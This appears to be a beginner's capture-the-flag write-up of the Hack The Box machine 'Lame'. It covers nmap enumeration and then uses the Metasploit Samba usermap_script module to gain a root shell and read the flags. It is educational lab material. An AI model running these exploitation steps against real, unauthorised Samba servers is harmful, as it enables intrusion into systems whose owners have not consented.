Lame was the first box released in Hack The Box (HTB). It's a good box to start with for anyone new to penetration testing since it's a relatively easy and gets you familiar with using Metasploit.

## Hack The Box

* Operating System: Linux
* Difficulty: Easy

## Enumeration

As always, let's start with enumeration by using nmap. I like to use:

<img src="/images/blog/lame/ipaddress.jpg" alt="nmap scan">

	PORT     STATE SERVICE     VERSION
	21/tcp   open  ftp         vsftpd 2.3.4
	|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
	| ftp-syst: 
	|   STAT: 
	| FTP server status:
	|      Connected to 10.10.14.35
	|      Logged in as ftp
	|      TYPE: ASCII
	|      No session bandwidth limit
	|      Session timeout in seconds is 300
	|      Control connection is plain text
	|      Data connections will be plain text
	|      vsFTPd 2.3.4 - secure, fast, stable
	|_End of status
	22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
	| ssh-hostkey: 
	|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
	|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
	139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
	445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
	3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
	Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
	Aggressive OS guesses: Linux 2.6.23 (92%), Belkin N300 WAP (Linux 2.6.30) (92%), Control4 HC-300 home controller (92%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (92%), Dell Integrated Remote Access Controller (iDRAC5) (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Citrix XenServer 5.5 (Linux 2.6.18) (92%), Linux 2.6.18 (ClarkConnect 4.3 Enterprise Edition) (92%)
	No exact OS matches for host (test conditions non-ideal).
	Network Distance: 2 hops
	Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel


Taking a look at the results, the most interesting ports are port 139 and 445 since they are SMB ports, and SMB is a common internet file system that is known to have vulnerabilities. We can also see that they are both currently running <i>Samba smbd 3.X - 4.X</i>, so we can take a look in Metasploit to see if we can find any exploits. 

To access Metasploit, we can enter in Terminal:

`msfconsole`

It takes a few minutes for Metasploit to open. Once it opens, we can search for an exploit that is related to Samba by using Metasploit's search feature:

`search samba`

From the search results, this one looks promising:

And based on the description, it says:

<i>This module exploits a command execution vulnerability in Samba versions 3.0.20 through 3.0.25rc3 when using the non-default "username map script" configuration option. By specifying a username containing shell meta characters, attackers can execute arbitrary commands. No authentication is needed to exploit this vulnerability since this option is used to map usernames prior to authentication!</i>

So let's try using it!

## Exploitation

To use an exploit, we can type in Metasploit:

`use exploit/multi/samba/usermap_script`

<img src="/images/blog/lame/metasploit.jpg" alt="using metasploit">

Now we need to configure the exploit so we can use it to attack the machine.

* `options`: Gives us the visibility on what options we have to configure the exploit.
* `set rhosts 10.10.10.3`: This would be the victim's IP address.
* `show targets`: This is where we select the target's type (e.g. OS) that we're exploiting.
* `exploit`: Running the exploit.

That worked! We now have access to the machine.

We can type `shell` to see if we can gain shell access.

Once we have shell access, we can type in:

* `whoami`: Tells us the type of privileges that we have. It looks like we have root access--perfect.
* `pwd`: In other words, print working directory. We can see that we're in the /root folder.

Since we have root access, we can locate both the root.txt and user.txt file to win the game. Remember to `cat` the file once you find it so you can read the contents and enter the flag into HTB.

Congratulations! We now have root access to the box Lame.

## Conclusion

Leaving network ports open in general is a huge security risk, especially if there are no controls implemented to keep it secure. When it came to the HTB Lame, we found out that the SMB port was running a version of Samba that was vulnerable to an exploit that allowed us to gain system access.
